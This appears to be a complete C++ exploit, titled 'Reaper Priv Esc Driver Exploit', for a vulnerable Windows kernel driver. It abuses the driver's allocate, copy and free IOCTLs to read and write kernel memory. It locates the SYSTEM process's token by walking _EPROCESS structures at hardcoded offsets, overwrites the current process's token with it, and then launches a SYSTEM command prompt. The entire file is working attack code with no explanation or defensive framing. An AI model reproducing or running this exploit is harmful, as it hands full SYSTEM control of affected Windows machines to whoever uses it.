#include <iostream>
#include <windows.h>
#include <psapi.h>
#include <winternl.h>

#define REAPER_SYM_LINK "\\\\.\\Reaper"
#define NTOSKRNL_EXE  "c:\\\\windows\\system32\\ntoskrnl.exe"
#define UNIQUE_PROCESS_ID_OFFSET 0x440
#define ACTIVE_PROCESS_LINKS_OFFSET 0x448
#define TOKEN_OFFSET 0x4b8

#define IOCTL_ALLOCATE 0x80002003
#define IOCTL_FREE 0x80002007
#define IOCTL_COPY 0x8000200b

#define ARRAY_SIZE 1024

typedef uint64_t QWORD;

typedef struct ReaperData {
    DWORD Magic;            // userData + 0
    DWORD ThreadId;         // userData + 4
    DWORD Priority;         // userData + 8
    DWORD Padding;          // userData + 12
    QWORD SrcAddress;       // userData + 16
    QWORD DstAddress;       // userData + 24
} ReaperData;

void ArbitraryWrite(HANDLE hDevice, QWORD src, QWORD dst)
{
    ReaperData userData;

    userData.Magic = 0x6a55cc9e;
    userData.ThreadId = GetCurrentThreadId();
    userData.Priority = 0;
    userData.SrcAddress = src;
    userData.DstAddress = dst;

    // Allocate pool memory
    //printf("[+] Allocating pool memory...\n");
    unsigned char outputBuf[1024];
    memset(outputBuf, 0, sizeof(outputBuf));
    ULONG bytesRtn;

    BOOL result = DeviceIoControl(hDevice,
        IOCTL_ALLOCATE,
        (LPVOID)&userData,
        (DWORD)sizeof(struct ReaperData),
        outputBuf,
        1024,
        &bytesRtn,
        NULL);

    // Copy operation
    //printf("[+] Copying privileged security token...\n");
    memset(outputBuf, 0, sizeof(outputBuf));
    result = DeviceIoControl(hDevice,
        IOCTL_COPY,
        (LPVOID)NULL,
        (DWORD)0,
        outputBuf,
        1024,
        &bytesRtn,
        NULL);

    // Free pool memory
    //printf("[+] Freeing pool memory...\n");
    memset(outputBuf, 0, sizeof(outputBuf));
    result = DeviceIoControl(hDevice,
        IOCTL_FREE,
        (LPVOID)NULL,
        (DWORD)0,
        outputBuf,
        1024,
        &bytesRtn,
        NULL);
}

void ArbitraryRead(HANDLE hDevice, QWORD src, QWORD dst)
{
    return ArbitraryWrite(hDevice, src, dst);
}

QWORD GetKernelBase()
{
    LPVOID drivers[ARRAY_SIZE];
    DWORD cbNeeded;
    EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);
    
    return (QWORD)drivers[0];
}

QWORD GetSystemTokenAddress(QWORD kernelBase, HANDLE hDevice)
{
    // Load kernel in to user land and get the PsInitialSystemProcess address
    HMODULE hKernel = LoadLibraryA(NTOSKRNL_EXE);
    HANDLE psInitialProcess = GetProcAddress(hKernel, "PsInitialSystemProcess");

    QWORD psOffset = (QWORD)psInitialProcess - (QWORD)hKernel;
    QWORD psAddress = (QWORD)kernelBase + (QWORD)psOffset;

    //printf("[+] PsInitialSystemProcess address: 0x%p\n", psAddress);

    QWORD dereferencedSystemEprocessAddress;
    ArbitraryRead(hDevice, psAddress, (QWORD)&dereferencedSystemEprocessAddress);

    printf("[+] SYSTEM _EPROCESS address: 0x%p\n", dereferencedSystemEprocessAddress);

    QWORD systemTokenAddress = dereferencedSystemEprocessAddress + TOKEN_OFFSET;

    FreeLibrary(hKernel);

    return systemTokenAddress;
}

QWORD GetCurrentTokenAddress(QWORD SystemProcessAddress, HANDLE hDevice)
{
    QWORD processAddress = SystemProcessAddress;
    QWORD processLinkAddress;
    QWORD processId;
    DWORD currentProcessId = GetCurrentProcessId();

    while(TRUE)
    {
        ArbitraryRead(hDevice, processAddress + ACTIVE_PROCESS_LINKS_OFFSET, (QWORD)&processLinkAddress);
        //printf("[+] Next _EPROCESS address: 0x%p\n", processLinkAddress - ACTIVE_PROCESS_LINKS_OFFSET);

        ArbitraryRead(hDevice, processLinkAddress - ACTIVE_PROCESS_LINKS_OFFSET + UNIQUE_PROCESS_ID_OFFSET, (QWORD)&processId);
        //printf("[+] _EPROCESS unique process ID: %d\n", processId);
        //printf("[+] Current process ID: %d\n", currentProcessId);

        processAddress = processLinkAddress - ACTIVE_PROCESS_LINKS_OFFSET;

        if ((DWORD)processId == currentProcessId)
        {
            break;
        }
    }

    printf("[+] Current _EPROCESS address: 0x%p\n", processAddress);
    return processAddress + TOKEN_OFFSET;
}

int main()
{
    printf("Reaper Priv Esc Driver Exploit\n------------------------------\n");

    // get a handle to the driver using the Symbolic link
    HANDLE hDevice = CreateFileA(REAPER_SYM_LINK, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);

    // if CreateFileA fails the handle will be -0x1
    if (hDevice == (HANDLE)-0x1)
    {
        // could not get a handle to the driver
        printf("[+] Driver handle: 0x%p\n", hDevice);
        printf("[!] Unable to get a handle to the driver.\n");
        return 1;
    }
    else
    {
        // print handle of driver
        printf("[+] Driver handle: 0x%p\n", hDevice);

        // get the kernel base address
        QWORD kernelBase = GetKernelBase();
        printf("[+] Kernel base address: 0x%p\n", (QWORD)kernelBase);

        // get the system token address
        QWORD systemTokenAddress = GetSystemTokenAddress(kernelBase, hDevice);
        printf("[+] SYSTEM token address: 0x%p\n", (QWORD)systemTokenAddress);

        // get the current process address
        QWORD currentTokenAddress = GetCurrentTokenAddress(systemTokenAddress - TOKEN_OFFSET, hDevice);
        printf("[+] Current token address: 0x%p\n", (QWORD)currentTokenAddress);

        QWORD systemTokenDereferenced;
        ArbitraryWrite(hDevice, (QWORD)systemTokenAddress, (QWORD)&systemTokenDereferenced);
        printf("[+] System token dereferenced: 0x%p\n", (QWORD)systemTokenDereferenced);

        // do the system token write
        printf("[+] Copying SYSTEM token...\n");
        ArbitraryWrite(hDevice, (QWORD)&systemTokenDereferenced, (QWORD)currentTokenAddress);

        printf("[+] Spawning new process...\n\n");

        // spawn a new command prompt
        system("cmd.exe");
        
    }

    CloseHandle(hDevice);

    return 0;
}
